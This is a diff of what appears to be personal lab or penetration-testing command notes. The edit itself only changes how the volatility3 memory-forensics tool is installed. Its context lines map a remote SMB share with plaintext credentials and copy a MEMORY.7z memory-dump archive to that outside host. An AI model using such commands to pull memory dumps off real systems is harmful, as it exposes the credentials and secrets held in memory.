@@ -86,8 +86,9 @@ net use \\10.10.14.82\share /user:test t3st
 xcopy MEMORY.7z \\10.10.14.82\share\
 get-filehash -algorithm md5 MEMORY.7z
 whoami /all
-==========(11)======================================================================================================================sudo apt update
+==========(11)======================================================================================================================
 git clone https://github.com/volatilityfoundation/volatility3.git
-cd volatility3
-python3 -m pip install -r requirements.txt --break-system-packages
-
+cd volatility3/
+python3 -m venv venv && . venv/bin/activate
+pip install -e .[dev]
+==========(12)======================================================================================================================
